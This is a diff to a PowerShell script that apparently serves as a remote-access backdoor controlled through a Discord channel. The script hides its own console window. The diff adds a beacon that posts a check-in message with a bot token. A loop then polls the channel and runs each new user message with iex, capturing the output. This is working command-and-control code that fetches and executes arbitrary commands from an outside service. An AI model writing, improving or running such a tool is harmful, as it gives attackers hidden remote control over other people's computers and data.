@@ -1,9 +1,9 @@
 
 # === Configuration ===
-$t = ""      #replace with your actual bot token
-$c = ""       #Replace with your actual Discord channel ID
+$t = ""     #  Replace with your actual bot token
+$c = ""            #  Replace with your actual Discord channel ID
 
-# === Hide PowerShell Window (from my testing might not work!) ===
+# === Hide PowerShell Window (from my testing didnt work that much, maybe a w11 thing?)===
 $a = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
 $h = (Get-Process -Id $PID).MainWindowHandle
@@ -18,7 +18,18 @@ function Send-DiscordMessage {
     $w.UploadString($u, "POST", $body) | Out-Null
 }
 
-# === main comms ===
+# === reply to this ===
+$w = New-Object System.Net.WebClient
+$w.Headers.Add("Authorization", "Bot $t")
+$w.Headers["Content-Type"] = "application/json"
+
+$u = "https://discord.com/api/v10/channels/$c/messages"
+$body = @{ content = "1" } | ConvertTo-Json -Depth 3
+$w.UploadString($u, "POST", $body) | Out-Null
+
+
+
+# === main command===
 $p = ""
 while ($true) {
     try {
@@ -26,7 +37,6 @@ while ($true) {
         $w = New-Object System.Net.WebClient
         $w.Headers.Add("Authorization", "Bot $t")
 
-        # Get the most recent message not from a bot
         $resp = $w.DownloadString($u)
         $msgs = $resp | ConvertFrom-Json
         $r = $msgs | Where-Object { -not $_.author.bot } | Select-Object -First 1
@@ -41,7 +51,7 @@ while ($true) {
             Write-Output "Executing: $m"
 	Write-Output "Output: $o"
 
-            $o = iex $m 2>&1  # Capture errors as well
+            $o = iex $m 2>&1  
             $l = $o -split "`n"
             $s = 0
             $b = @()
